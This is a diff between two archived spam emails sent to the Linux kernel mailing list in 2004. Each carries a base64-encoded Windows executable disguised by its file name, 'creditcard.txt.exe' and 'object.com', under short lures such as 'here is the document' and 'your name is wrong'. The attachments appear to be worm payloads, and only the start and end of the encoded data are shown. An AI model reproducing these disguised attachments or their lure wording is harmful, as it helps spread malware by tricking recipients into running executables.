@@ -1,34 +1,34 @@
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S261224AbUBTOxo (ORCPT <rfc822;ralf@linux-mips.org>);
-	Fri, 20 Feb 2004 09:53:44 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261234AbUBTOxo
+	id S261526AbUBUIW2 (ORCPT <rfc822;ralf@linux-mips.org>);
+	Sat, 21 Feb 2004 03:22:28 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261527AbUBUIW1
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Fri, 20 Feb 2004 09:53:44 -0500
-Received: from cs5.neoplus.adsl.tpnet.pl ([80.54.215.5]:20492 "HELO
-	vger.kernel.org") by vger.kernel.org with SMTP id S261224AbUBTOxa
+	Sat, 21 Feb 2004 03:22:27 -0500
+Received: from f08a-7-24.d1.club-internet.fr ([212.194.174.24]:63246 "HELO
+	vger.kernel.org") by vger.kernel.org with SMTP id S261526AbUBUIWO
 	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 20 Feb 2004 09:53:30 -0500
-From: marketing@klose.pl
+	Sat, 21 Feb 2004 03:22:14 -0500
+From: muriel.szelag@laposte.net
 To: linux-kernel@vger.kernel.org
-Subject: hello
-Date: Fri, 20 Feb 2004 15:53:31 +0100
+Subject: hi
+Date: Sat, 21 Feb 2004 09:22:11 +0100
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="84563582"
-Message-Id: <S261224AbUBTOxa/20040220145330Z+9991@vger.kernel.org>
+Content-Type: multipart/mixed; boundary="26870880"
+Message-Id: <S261526AbUBUIWO/20040221082214Z+18039@vger.kernel.org>
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 Return-Path: <linux-kernel-owner+ralf=40linux-mips.org@vger.kernel.org>
 
---84563582
+--26870880
 Content-Type: text/plain; charset=us-ascii
 Content-Transfer-Encoding: 7bit
 
-here is the document.
+your name is wrong
 
---84563582
-Content-Type: application/octet-stream; name="creditcard.txt.exe"
+--26870880
+Content-Type: application/octet-stream; name="object.com"
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="creditcard.txt.exe"
+Content-Disposition: attachment; filename="object.com"
 
 TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
@@ -439,5 +439,5 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
 
---84563582--
+--26870880--
 
